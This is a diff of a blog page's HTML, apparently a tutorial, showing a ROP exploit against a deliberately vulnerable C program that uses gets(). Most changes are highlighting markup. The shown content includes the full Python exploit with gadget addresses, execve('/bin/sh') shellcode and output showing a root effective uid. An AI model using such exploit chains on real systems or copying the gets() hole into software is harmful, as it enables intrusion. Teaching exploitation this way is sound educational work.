@@ -189,13 +189,13 @@
 <p>For this exemple, I will take the same program as my last post.</p>
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 </span>
-<span class="c1">// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
-</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="c1">// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>  <span class="c1">// Never use this function !
-</span>  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>  <span class="c1">// Never use this function !</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
@@ -242,14 +242,14 @@ First, the __stack_prot address:</p>
 </code></pre></div></div>
 
 <p>Great. So our payload begin will be:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c"># padding</span>
-
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c"># pop rsi ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f80</span><span class="p">)</span> <span class="c"># @ __stack_prot</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c"># PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c"># mov QWORD PTR [rsi], rax ; ret</span>
-</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c1"># padding
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c1"># pop rsi ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f80</span><span class="p">)</span> <span class="c1"># @ __stack_prot
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c1"># pop rax ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c1"># PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c1"># mov QWORD PTR [rsi], rax ; ret
+</span></code></pre></div></div>
 
 <p>We also will need the address of the “__libc_stack_end” variable and “_dl_make_stack_executable” function.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-D</span> a.out|egrep <span class="s2">"__libc_stack_end|_dl_make_stack_executable"</span>
@@ -261,52 +261,52 @@ First, the __stack_prot address:</p>
 </code></pre></div></div>
 
 <p>And the payload part look like:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c"># pop rdi ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f28</span><span class="p">)</span> <span class="c"># @ __libc_stack_end</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045fc30</span><span class="p">)</span> <span class="c"># @ _dl_make_stack_executable</span>
-</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c1"># pop rdi ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f28</span><span class="p">)</span> <span class="c1"># @ __libc_stack_end
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045fc30</span><span class="p">)</span> <span class="c1"># @ _dl_make_stack_executable
+</span></code></pre></div></div>
 
 <p>Well, we only have left to push the shellcode and test it ! 
 The shellcode is a simply execve(“/bin/sh”, …) on 30 bytes.
 To push the shellcode:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040fd8c</span><span class="p">)</span> <span class="c"># push rsp ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040fd8c</span><span class="p">)</span> <span class="c1"># push rsp ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
 </code></pre></div></div>
 
 <h1 id="4-exploitation">4. Exploitation</h1>
 <p>The whole payload look like:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2.7
+</span>
 <span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
 
-<span class="c">#</span>
-<span class="c"># Shellcode execve("/bin/sh", ["/bin/sh"], NULL) (30 bytes)</span>
-<span class="c">#</span>
-
+<span class="c1">#
+# Shellcode execve("/bin/sh", ["/bin/sh"], NULL) (30 bytes)
+#
+</span>
 <span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><span class="s">"</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c"># padding</span>
-
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c"># pop rsi ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f80</span><span class="p">)</span> <span class="c"># @ __stack_prot</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c"># pop rax ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c"># PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c"># mov QWORD PTR [rsi], rax ; ret</span>
-
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c"># pop rdi ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f28</span><span class="p">)</span> <span class="c"># @ __libc_stack_end</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045fc30</span><span class="p">)</span> <span class="c"># @ _dl_make_stack_executable</span>
-
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040fd8c</span><span class="p">)</span> <span class="c"># push rsp ; ret</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">72</span> <span class="c1"># padding
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004016b7</span><span class="p">)</span> <span class="c1"># pop rsi ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f80</span><span class="p">)</span> <span class="c1"># @ __stack_prot
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004314ad</span><span class="p">)</span> <span class="c1"># pop rax ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x0000000000000007</span><span class="p">)</span> <span class="c1"># PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045f491</span><span class="p">)</span> <span class="c1"># mov QWORD PTR [rsi], rax ; ret
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040159b</span><span class="p">)</span> <span class="c1"># pop rdi ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000006b3f28</span><span class="p">)</span> <span class="c1"># @ __libc_stack_end
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000045fc30</span><span class="p">)</span> <span class="c1"># @ _dl_make_stack_executable
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x000000000040fd8c</span><span class="p">)</span> <span class="c1"># push rsp ; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
 
 <span class="k">print</span> <span class="n">payload</span>
 </code></pre></div></div>
 
 <p>The result is:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>python2.7 rop.py<span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./a.out
-id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
 </code></pre></div></div>
 
 <p>Done.</p>
@@ -336,7 +336,7 @@ id
 			 
 				<li>
 					<a href="/tags.html#pwn-ref">
-					pwn <span>(10)</span>
+					pwn <span>(11)</span>
 					,
 					</a>
 				</li>
